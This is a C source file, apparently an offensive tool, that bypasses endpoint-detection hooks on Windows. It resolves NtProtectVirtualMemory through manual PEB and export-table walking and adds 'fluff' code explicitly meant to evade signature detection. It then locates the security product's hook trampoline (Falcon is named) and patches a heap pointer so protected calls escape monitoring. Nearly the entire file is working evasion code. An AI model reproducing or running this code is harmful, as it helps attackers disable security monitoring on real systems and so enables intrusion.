#include <windows.h>
#include <stdio.h>
#include "structs.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// Random fluff to break up easily detectable custom GetMod/GetProc
int expectedString(VOID * buf, int strSize) {
    if (IsTextUnicode(buf, strSize, NULL)) {
        CHAR * str = (CHAR *) buf;
        for (int i = 0; i < strSize; i++) {
            CharUpperW(str[i]);
        }
        return 2;
    }
    
    return 0;
}

HMODULE hlpGetModuleHandle(LPWSTR lpModule, VOID * checkAddr) {
    PEB * peb = (PEB *) __readgsqword(0x60);

    PEB_LDR_DATA * Ldr = (PEB_LDR_DATA *) peb->Ldr;
    LIST_ENTRY * pModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY * pListEntryFirst =  pModuleList->Flink;

    // Fluff
    WCHAR * name = L"licenseCompliance";
    CHAR * additional = "gplTaxonomy";
    if (expectedString(name, sizeof(name)) == 2) {
        int ret = 0;
        ret = expectedString(additional, sizeof(additional));

        if (ret != 0) {
            return NULL;
        }
    }

    for (
        LIST_ENTRY * pListEntry = pListEntryFirst;
        pListEntry != pModuleList;
        pListEntry = pListEntry->Flink
    ) {
        LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) pListEntry - sizeof(LIST_ENTRY));

        if (lpModule != NULL) {
            if (lstrcmpiW(pEntry->BaseDllName.Buffer, lpModule) == 0) {
                return pEntry->DllBase;
            }
        }

        if (checkAddr != NULL) {
            if (checkAddr >= pEntry->DllBase && checkAddr <= ((BYTE *) pEntry->DllBase + pEntry->SizeOfImage)) {
                return pEntry->DllBase;
            }
        }
    }

    return NULL;
}

VOID * GetFunc(VOID * pModAddr, LPCSTR pFuncName) {
    VOID * pFuncAddr = NULL;
    BYTE * pBaseAddr = pModAddr;

    IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *) pBaseAddr;
    IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS32 *) (pBaseAddr + pDosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER * pOptionalHeader = &pNtHeaders->OptionalHeader;

    // Fluff
    WCHAR * name = L"axaTriggerW";
    CHAR * additional = "axaTriggerA";
    if (expectedString(name, sizeof(name)) == 2) {
        int ret = 0;
        ret = expectedString(additional, sizeof(additional));

        if (ret != 0) {
            return NULL;
        }
    }

    IMAGE_DATA_DIRECTORY * pDataDir = (IMAGE_DATA_DIRECTORY *) &(pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    IMAGE_EXPORT_DIRECTORY * pExportDir = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pDataDir->VirtualAddress);

    DWORD * pEAT = (DWORD *) (pBaseAddr + pExportDir->AddressOfFunctions);
    DWORD * pNames = (DWORD *) (pBaseAddr + pExportDir->AddressOfNames);
    WORD * pOrds = (WORD *) (pBaseAddr + pExportDir->AddressOfNameOrdinals);

    for (int i = 0; i < pExportDir->NumberOfNames; i++) {
        CHAR * pTempName = (CHAR *) pBaseAddr + (DWORD_PTR) pNames[i];

        WORD nameOrd = (WORD) pOrds[i];

        if (lstrcmpiA(pTempName, pFuncName) == 0) {
            pFuncAddr = (pBaseAddr + (DWORD_PTR) pEAT[nameOrd]);

            break;
        }
    }

    return pFuncAddr;
}

VOID * FindHook(VOID * pFunc, LPCSTR pFuncName) {
    BYTE * firstByte = (BYTE *) pFunc;

    // Crude check for mov r10,rcx to determine whether function makes syscall or is implemented in module
    if (
        *firstByte != 0x4c ||
        *(firstByte + 1) != 0x8b ||
        *(firstByte + 2) != 0xd1
    ) {
        printf("[!] Unexpected bytes found at function starting at: %p\n", pFunc);
        return NULL;
    }

    BYTE * fourthByteAddr = firstByte + 3; 
    BYTE fourthByte = *fourthByteAddr;
    if (
        fourthByte == 0xeb ||
        fourthByte == 0xe9 ||
        fourthByte == 0xff ||
        fourthByte == 0xea
    ) {
        return fourthByteAddr;
    } else {
        return NULL;
    }
}

VOID * ResolveJmp(BYTE * jmpAddr, VOID ** nextInstructionOut) {
    BYTE jmpOp = *jmpAddr;

    if (jmpOp == 0xe9) {
        BYTE * nextInstruction = jmpAddr + 5;
        DWORD offset = *((DWORD *) (jmpAddr + 1));

        if (nextInstructionOut != NULL) {
            *nextInstructionOut = nextInstruction;
        }

        return nextInstruction + offset;
    }

    if (jmpOp == 0xff) {
        VOID * nextInstruction = jmpAddr + 6;
        VOID * addr = (VOID *) *((DWORDLONG *) nextInstruction);

        if (nextInstructionOut != NULL) {
            *nextInstructionOut = nextInstruction;
        }

        return addr;
    }

    return NULL;
}

WORD ScourModule(VOID * addrToFind, VOID ** unhookAddr) {
    MEMORY_BASIC_INFORMATION info;

    for (
        BYTE * p = NULL;
        VirtualQueryEx(GetCurrentProcess(), p, &info, sizeof(info)) == sizeof(info);
        p += info.RegionSize
    ) {
        // Memory sections we want to include. In the case of Falcon, the section is COMMITTED/PRIVATE/RX
        if (info.State != MEM_COMMIT || info.Type != MEM_PRIVATE || info.Protect != PAGE_EXECUTE_READ) {
            continue;
        }

        // printf("Base Address: %p\n", info.BaseAddress);
        // printf("Allocation Base: %p\n", info.AllocationBase);
        // printf("Allocation protect: %x\n", info.AllocationProtect);
        // printf("Size of region: %x\n", info.RegionSize);
        // printf("State: %x\n", info.State);
        // printf("Protect: %x\n", info.Protect);
        // printf("Type: %x\n", info.Type);
        
        for (SIZE_T i = 0; i < (info.RegionSize - sizeof(VOID *)); i++) {
            VOID * checkBytes = (VOID *) *((DWORDLONG *) ((BYTE *) info.BaseAddress + i));

            if (checkBytes == addrToFind) {
                BYTE * finalJmpAddr = (BYTE *) info.BaseAddress + i;

                // Only walk back 100 bytes. If it's not found within that, we are probably in the wrong place.
                for (int backCounter = 1; backCounter < 100; backCounter++) {
                    if (
                        *((BYTE *) finalJmpAddr - backCounter) == 0xb8 &&
                        *((BYTE *) ((finalJmpAddr - backCounter) + 3)) == 0x00 &&
                        *((BYTE *) ((finalJmpAddr - backCounter) + 4)) == 0x00
                    ) { 
                        *unhookAddr = (BYTE *) finalJmpAddr - backCounter;
                        
                        WORD syscallID = *(WORD *)((BYTE *) ((finalJmpAddr - backCounter) + 1));
                        return syscallID;
                    }
                }
            }
        }
    }

    return NULL;
}

BOOL PatchHeapAddr(BYTE * landingAddr, VOID * targetAddr) {
    DWORD_PTR * patchAddr = NULL;
    BYTE * nextLanding = NULL;
    BYTE * nextInstruction = NULL;
    BYTE * initialHeapAddr = NULL;
    VOID * xorAddr1 = NULL;
    VOID * xorAddr2 = NULL;
    DWORD offset = 0;
    int stackValCounter = 0;

    while (*landingAddr == 0x51) {
        stackValCounter++;
        landingAddr++;
    }

    nextLanding = ResolveJmp(landingAddr, NULL);
    if (nextLanding == NULL) {
        return FALSE;
    }

    offset = *((DWORD *) (nextLanding + 3));
    nextInstruction = nextLanding + 7;

    xorAddr1 = (VOID *) *((DWORDLONG *) (nextInstruction + offset));

    nextInstruction = nextInstruction + 6;
    offset = *((DWORD *) (nextInstruction + 3));

    nextInstruction = nextInstruction + 7;

    xorAddr2 = (VOID *) *((DWORDLONG *) (nextInstruction + offset));

    initialHeapAddr = ((DWORDLONG) xorAddr1) ^ ((DWORDLONG) xorAddr2);

    patchAddr = initialHeapAddr + (0x45 * (stackValCounter)) + 0x28;
    printf("patchAddr: %p\nPress enter to patch...\n", patchAddr);

    *patchAddr = targetAddr;

    return TRUE;
}

int main(void) {
    VOID * unhookModule = NULL;
    VOID * funcAddr = NULL;
    VOID * funcAddrToFind = NULL;

    // Function to unhook
    WCHAR modName[] = L"ntdll.dll";
    CHAR funcName[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
    
    BYTE * firstJmp = NULL;
    BYTE * firstLanding = NULL;
    VOID * unhookAddr = NULL;
    WORD syscallID = NULL;

    unhookModule = hlpGetModuleHandle(modName, NULL);
    if (unhookModule == NULL) {
        printf("Error retrieving base addr of module\n");
        return -1;
    }

    funcAddr = GetFunc(unhookModule, funcName);
    if (funcAddr == NULL) {
        printf("Error retrieving address of func\n");
        return -1;
    }

    firstJmp = FindHook(funcAddr, funcName);
    if (firstJmp == NULL) {
        printf("Function does not appear to be hooked\n");
        return -1;
    }

    firstLanding = ResolveJmp(firstJmp, &funcAddrToFind);
    if (firstLanding == NULL) {
        printf("[!] Error resolving jmp\n");
        return -1;
    }

    syscallID = ScourModule(funcAddrToFind, &unhookAddr);
    if (unhookAddr == NULL) {
        printf("[!] Unable to find unhook point\n");
        return -1;
    }

    printf("[!] Syscall ID: %x\n", syscallID);
    printf("[!] Final address to use for fix: %p\n", unhookAddr);

    PatchHeapAddr(firstLanding, unhookAddr);
    puts("Press enter to allocate mem and change protections...");
    getchar();
    
    // Test it's worked. Set a breakpoint on the NTDLL syscall stub and step through. After a couple of jumps, it will jump straight to the relocated syscall stub
    DWORD oldProt = NULL;
    VOID * mem = HeapAlloc(GetProcessHeap(), 0, 100);

    VirtualProtect(mem, 100, PAGE_EXECUTE_READ, &oldProt);

    return 0;
}
